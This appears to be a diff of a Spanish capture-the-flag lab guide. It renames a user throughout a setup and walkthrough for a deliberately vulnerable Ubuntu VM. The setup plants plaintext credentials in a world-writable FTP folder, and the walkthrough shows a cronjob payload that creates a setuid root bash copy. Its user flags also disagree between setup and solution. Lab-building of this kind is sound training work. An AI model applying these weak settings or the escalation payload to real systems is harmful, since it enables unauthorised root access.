@@ -49,7 +49,7 @@ Se crea una VM en VirtualBox, VMware o KVM con Ubuntu Server 20.04:
 
 ```bash
 # Como root:
-adduser orami
+adduser oramiuser
 echo "technova{this_is_the_user_flag}" > /home/oramiuser/user.txt
 echo "technova{this_is_the_root_flag}" > /root/root.txt
 
@@ -90,7 +90,7 @@ Preparación del directorio para FTP:
 mkdir -p /srv/ftp/files
 chmod 755 /srv/ftp
 chmod 777 /srv/ftp/files
-echo "credenciales: orami:pass123" > /srv/ftp/files/leeme.txt
+echo "credenciales: oramiuser:123456" > /srv/ftp/files/leeme.txt
 ```
 
 Reinicio del servicio:
@@ -101,10 +101,10 @@ systemctl restart vsftpd
 
 ### 4. Configurar SSH
 
-Se requiere que `orami` pueda acceder via SSH con contraseña:
+Se requiere que `oramiuser` pueda acceder via SSH con contraseña:
 
 ```bash
-passwd orami  # se usa la misma contraseña que en el FTP
+passwd oramiuser  # se usa la misma contraseña que en el FTP
 nano /etc/ssh/sshd_config
 ```
 
@@ -217,7 +217,7 @@ Verificación del usuario y lectura de la flag:
 
 ```bash
 whoami
-# orami
+# oramiuser
 
 cat /home/oramiuser/user.txt
 # technova{user_flag_is_here}
@@ -244,7 +244,7 @@ ls -l /usr/local/bin/backup.sh
 
 ### Fase 5: Escalada de privilegios (cronjob vulnerable)
 
-Sobrescritura del script como `orami`:
+Sobrescritura del script como `oramiuser`:
 
 ```bash
 echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > /usr/local/bin/backup.sh
